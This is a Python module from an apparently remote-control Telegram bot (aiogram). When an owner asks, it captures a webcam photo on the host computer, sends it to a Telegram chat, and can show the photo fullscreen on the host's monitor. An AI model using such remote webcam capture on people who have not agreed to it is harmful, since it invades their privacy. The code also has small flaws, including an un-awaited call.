from aiogram import types, Router
from aiogram.filters import Command

from Bot.config import bot

from Bot.helpers.webcam import webcam
from Bot.helpers.check_chat_id import check_chat_id
from Bot.helpers.open_image_fullscreen import open_image_fullscreen
from Bot.helpers.get_session_time import session_time
from Bot.helpers.access import get_json_owners

from Bot.inline_keyboards.menu import inline_keyboard_menu
from Bot.inline_keyboards.take_photo_end import upload_to_monitor

router = Router()


@router.callback_query(lambda c: c.data == "take_photo")
@router.message(Command("take_photo"))
async def take_photo_command(event: types.Message or types.CallbackQuery):
    chat_id, is_message = check_chat_id(event)

    if chat_id in get_json_owners():
        if is_message:
            await event.answer(
                chat_id=chat_id,
                text="Wait..."
            )
            filepath = await webcam(chat_id)

            photo = types.FSInputFile(filepath)

            await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                reply_markup=upload_to_monitor(filepath)
            )
            await event.answer(
                text="🤯"
            )
        else:
            await event.message.edit_text(
                text="Wait..."
            )
            filepath = await webcam(chat_id)

            photo = types.FSInputFile(filepath)

            await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                reply_markup=upload_to_monitor(filepath)
            )
            await event.message.answer(
                text="🤯"
            )
    else:
        await event.answer(
            text="You haven`t permissions."
        )


@router.callback_query(lambda c: c.data.startswith("upload_photo_"))
async def upload_photo_to_monitor(query: types.CallbackQuery):
    chat_id, is_message = check_chat_id(query)

    if chat_id in get_json_owners():
        msg = await bot.send_message(
            chat_id=chat_id,
            text="Uploading photo..."
        )
        await open_image_fullscreen(image_path=query.data[len("upload_photo_"):])
        msg.edit_text(
            text=f"Successful.{session_time()}",
            reply_markup=inline_keyboard_menu(chat_id)
        )
